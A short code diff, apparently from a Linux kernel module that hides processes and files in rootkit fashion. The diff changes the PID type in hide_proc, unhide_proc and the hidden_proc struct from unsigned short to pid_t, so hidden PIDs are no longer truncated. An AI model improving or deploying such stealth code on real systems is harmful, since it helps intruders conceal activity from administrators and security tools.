@@ -3,7 +3,7 @@
 
 struct hidden_proc
 {
-    unsigned short pid;
+    pid_t pid;
     struct list_head list;
 };
 
@@ -227,7 +227,7 @@ void unhide_file ( char *name )
     }
 }
 
-void hide_proc ( unsigned short pid )
+void hide_proc ( pid_t pid )
 {
     struct hidden_proc *hp;
 
@@ -239,7 +239,7 @@ void hide_proc ( unsigned short pid )
     list_add(&hp->list, &hidden_procs);
 }
 
-void unhide_proc ( unsigned short pid )
+void unhide_proc ( pid_t pid )
 {
     struct hidden_proc *hp;
 
